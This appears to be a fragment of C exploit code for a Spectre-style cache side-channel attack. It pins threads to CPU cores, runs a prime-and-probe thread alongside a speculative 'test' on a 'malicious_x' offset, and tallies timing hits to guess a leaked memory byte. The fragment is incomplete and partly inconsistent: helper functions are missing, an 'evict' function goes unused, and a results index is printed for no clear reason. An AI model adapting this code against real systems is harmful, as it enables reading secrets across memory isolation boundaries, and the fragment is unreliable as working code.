void *evict(void *arguments) { 
    cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(1,&mask);
	if(pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&mask)<0)
	{
		   perror("pthread_setaffinity_np");
	}

	struct pp_arg_struct *args = arguments;
	int junk = args->junk;
	int tries = args->tries;
	int *results = args->results;

    for(int z=0;z<10;z++)
	flag_T=1;
	while (flag != 1) {}
	flag = 0;
	probe(junk, tries, results);
}

void *primeTest(void *arguments) { 
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(2,&mask);
	if(pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&mask)<0)
	{
		   perror("pthread_setaffinity_np");
	}


	struct pt_arg_struct *args = arguments;
	size_t malicious_x = args->malicious_x;
	int tries = args->tries;

	while (flag_T != 1) {}
	flag_T = 0;
	test(malicious_x, tries);
	flag = 1;
}

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, junk = 0;

	pthread_t pp_thread, pt_thread;

	struct pp_arg_struct pp_args;
	struct pt_arg_struct pt_args;

	pt_args.malicious_x = malicious_x;
	pp_args.results = results;
	pp_args.junk = junk;

	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (tries = 20; tries > 0; tries--) {
		pp_args.tries = tries;
		pt_args.tries = tries;
	
	flag=0;
	flag_T=0;
	if(pthread_create(&pp_thread,NULL,primeProbe,&pp_args)!=0)
		{
			perror("pthread_create");
		}

	if(pthread_create(&pt_thread,NULL,primeTest,&pt_args)!=0)
		{
			perror("pthread_create");
		}

		pthread_join(pp_thread, NULL);
		pthread_join(pt_thread, NULL);
		
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; 

	}
	results[0] ^= junk;
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];

	printf("%d\n",results[84]);
}
